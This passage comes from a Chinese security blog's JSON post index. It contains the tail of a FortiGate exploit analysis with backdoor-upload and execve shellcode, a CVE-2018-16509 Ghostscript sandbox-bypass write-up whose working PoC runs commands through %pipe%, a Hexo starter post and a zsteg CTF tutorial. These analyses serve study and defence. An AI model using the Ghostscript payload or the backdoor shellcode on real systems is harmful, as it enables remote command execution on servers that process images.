; len push edx mov ecx, [ebp-10h] ; addr push ecx mov ebx, [ebp-0Ch] ; backdoor fd push ebx mov eax, 4 int 80h ; LINUX - sys_write mov ecx, [ebp-1Ch] add ecx, eax mov [ebp-1Ch], ecx mov ecx, [ebp-8] sub ecx, eax mov [ebp-8], ecx jcxz loc_A56D3B2 ; loop until the file write complete jmp short sys_read2 文件接收并写入完成后，关闭文件，并且发送第二个确认字符ack2，确认上传后门文件的完整性。12345678910111213sys_write3: mov eax, [ecx+0Ch] mov ebx, [ebp-1Ch] ; filesize xor eax, ebx mov [ecx+8], eax mov edx, 25h ; &apos;%&apos; ; len push edx push ecx mov ebx, [ebp-4] ; socket fd push ebx mov eax, 4 int 80h ; LINUX - sys_write jmp short loc_A56D40C 最后调用execve，将当前httpsd进程替换为后门程序123456789101112sys_execve: push eax push edi mov edx, esp push eax push esi mov ecx, esp push edx ; envp push ecx ; argv push ebx ; path mov eax, 0Bh int 80h ; LINUX - sys_execve Tip: 要从EGREGIOUSBLUNDER中直接提取shellcode可能有些困难，所以可以在GDB调试时，等待shellcode自解码完成后dump出指定位置内存放入IDA中分析。另外以上过程省略了一些细节，有兴趣的读者可以自己试试。 七、总结算起来这应该是笔者分析的第一个二进制漏洞吧，虽然只是一个经典的栈溢出，且目标没有ASLR、NX、Canary等漏洞缓解机制，但当时分析的时候还是感觉很过瘾。特别植入后门的工程化和专业化都很让人着迷，所以在此和大家一同分享，当然因为是第一次分析二进制漏洞，而且时间过去太久，如果文中有任何错误和疏漏欢迎在留言中指出☺。 八、参考资料[1]FortiGate Configuration examples[2]tar formart (wikipedia)#UStar_format)[3]FortiGate CLI HACKING[4]Shellcoder’s Programming Uncovered（《shellcoder编程揭秘 》【美】Kris Kaspersky著）","link":"/2017/11/12/fortigate/"},{"title":"CVE-2018-16509：Ghostscrpt沙箱绕过漏洞","text":"一、背景Ghostscript是Adobe PostScript语言的解释器，能查看以及打印PS、EPS、PDF格式的文件。支持Linux、MacOS、Windows等平台，并且还为ImagineMagic、Python PIL等程序和库所使用。 8月21日，Google安全研究员Tavis Ormandy（@taviso）披露了多个GhostScript的漏洞，在&lt;=9.23的版本中，通构造恶意PostScript脚本，可以绕过SAFER安全沙箱，从而造成文件读取、文件删除甚至命令执行等严重后果。其根本原因是GhostScript解析restore命令时，会暂时将参数LockSafetyParams设置为False，从而关闭SAFER模式。 二、漏洞细节2.1 Ghostscript安全模式（SAFER mode）Ghostscript包含一个可选的-dSAFER选项，设置该选项启动安全沙箱模式后，与文件相关的操作符将被禁止，具体作用有如下几个： 禁用deletefile和renamefile操作符，能够打开管道命令（％pipe％cmd），同时只能打开stdout和stderr进行写入 禁用读取stdin以外的文件 设置设备的LockSafetyParams参数为True，从而防止使用OutputFile参数写入文件 阻止/GenericResourceDir、/FontResourceDir、/SystemParamsPassword或/StartJobPassword被更改 例如当我们未加-dSAFER参数时，可以成功读取/etc/passwd文件： 加上-dSAFER参数后，出现invalidfileaccess错误： 2.2 绕过SAFER沙箱多个PostScript操作可以绕过-dSAFER提供的保护，这可以允许攻击者使用任意参数执行命令。首先对Tavis提供的PoC进行测试，在开启了安全沙箱的情况下（-dSAFER），可以成功执行任意shell命令： 再比如使用前面背景中提到的ImageMagick工具中的convert命令测试PoC，可以看到ImageMagick同样受到影响： 在源码目录下使用命令grep -r dSAFER找到和该选项相关的信息，看到下面这段注释中说明了该选项的效果——将LockSafetyParams设置为True。 再查看和LockSafetyParams相关操作，通过注释看到，这个布尔类型变的量值为true时，可以防止某些不安全的操作。同时在文件psi/zdevice2.c的第269行，该变量被设置为了False，且仅有此处修改了LockSafetyParams的值为False，因此可以推测：PoC中某条PostScript语句解析时导致了这个改变。 2.3 调试分析过程接下来进行验证，使用GDB调试Ghostscript并设置好程序参数：1set args -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null 根据前面grep的输出，找到“dev_old-&gt;LockSafetyParams = false; ”语句在函数restore_page_device()中，并在此处下断，根据PoC运行程序输入： 设置成像区域——legal（a4、b5、letter等也可以）： 接着输入{null restore} stopped {pop} if，程序中断在此处： 再对dev_old-&gt;LockSafetyParams变量设置观察点，继续运行程序，和预想的一样，LockSafetyParams的值在这里被改变了。 查看栈回溯，发现当前函数在一系列带有“interpret”的函数中被调用，从名称推断这些函数用于解析PostScript语句。 这里我们在#2处下断，观察到了解释器处理stopped、null、restore等关键字的过程，至此SAFER沙箱如何被绕的过程就逐渐清晰了。 2.4 探究漏洞成因完整过程如下：1234567$ gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null GS&gt;legalGS&gt;{ null restore } stopped { pop } ifGS&gt;legalGS&gt;mark /OutputFile (%pipe%id) currentdevice putdevicepropsGS&lt;1&gt;showpageuid=0(root) gid=0(root) groups=0(root) 经过上面的分析我们可以知道简单的一条{null restore} stopped {pop} if就能绕过SAFER沙箱，但其原理又是什么呢？ PostScript是一种“逆波兰式”（Reverse Polish Notation，也称为后缀表达式）的语言。简单来说就是操作数在前，操作符在后。PoC中这条语句是一条典型的PostScript异常处理语句，stopped操作符用于PostScript的异常处理，也就是说stopped执行前面的{}中给出的过程，如果解释器在执行该过程期间出现错误，它将终止该过程并执行stopped操作符之后{}中的过程。 null restore会引起类型检查错误（/typecheck error），同时restore的执行导致LockSafetyParams设置为False，stopped捕获到异常，弹出栈顶元素null，GS继续运行，但此时LockSafetyParams的值还没恢复为True。 值得一提的是，GhostScript的官方文档中提到了restore操作符存在导致绕过SAFER模式的风险。 三、漏洞利用OutputFile参数用于设置输出文件名，另外在Linux/Unix上，还可以通过设备%pipe%将输出发送到管道（Windows中也可以，需要使用两个%）。例如，要将输出通过管道传输到lpr可以使用：/OutputFile (%pipe%lpr） 查阅官方文档可知，%pipe%功能由popen函数支持，在调试中也能确认这一点： popen()函数通过创建管道的方式，调用fork()启动一个子进程，并将传入popen()的命令送到/bin/sh以-c参数执行。可以通过在此处注入命令实现漏洞利用，如下图中演示的那样，另外将PostScript编码到图像中，可以在使用GhostScript的Web服务器上执行任意指令（例如服务器使用ImageMagick处理上传的图像时）。 四、参考资料[1]More Ghostscript Issues: Should we disable PS coders in policy.xml by default?[2]PostScript Language Reference(third edition)[3]PostScript语言安全研究(ImageMagick新漏洞分析)[4]Ghostscript官方文档[6]A GHOST FROM POSTSCRIPT","link":"/2019/07/03/ghostscrpt/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2019/07/03/hello-world/"},{"title":"隐写信息快速检测工具——zsteg","text":"zsteg是一个用于检测PNG和BMP中的隐藏数据隐藏数据的工具。 Ubuntu中可以使用apt-get命令行工具来安装Ruby和RubyGems，如下所示： 1sudo apt-get install ruby-full rubygems Kali Linux 中则自带了RubyGems。 然后用以下命令安装zsteg后即可使用： 1$ gem install zsteg 切换至图片 你瞅啥.bmp 所在目录下，分别输入以下命令： 123$ zsteg 你瞅啥.bmp --bits 1 --channel r --lsb --order xy --limit 2048$ zsteg 你瞅啥.bmp --bits 1 --channel g --lsb --order xy --limit 2048$ zsteg 你瞅啥.bmp --bits 1 --channel b --lsb --order xy --limit 2048 --bits 1：每次只摘取颜色通道中的第 1 个比特。 --channel r：只摘取红色通道的比特位。 --lsb：按最低有效位优先的顺序进行摘取。 --order xy：按照从左至右、从上至下的顺序对图像素点进行摘取。 --limit 2048：最多摘取输出 2048 字节。 发现没有有效信息，于是使用一个懒人专属的选项 --all，可将所有可能的摘取方法都尝试一遍： 最终在结果中挑选出可能的隐写信息：qwxf{you_say_chick_beautiful?}","link":"/2018/11/14/隐写信息快速检测工具——zsteg/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"Canary","slug":"Canary","link":"/tags/Canary/"},{"name":"StackOverflow","slug":"StackOverflow","link":"/tags/StackOverflow/"},{"name":"漏洞","slug":"漏洞","link":"/tags/漏洞/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Fortigate","slug":"Fortigate","link":"/tags/Fortigate/"},{"name":"防火墙","slug":"防火墙","link":"/tags/防火墙/"},{"name":"网络设备","slug":"网络设备","link":"/tags/网络设备/"},{"name":"ghostscrpt","slug":"ghostscrpt","link":"/tags/ghostscrpt/"},{"name":"MISC","slug":"MISC","link":"/tags/MISC/"},{"name":"Steganalysis","slug":"Steganalysis","link":"/tags/Steganalysis/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"漏洞分析","slug":"漏洞分析","link":"/categories/漏洞分析/"}]}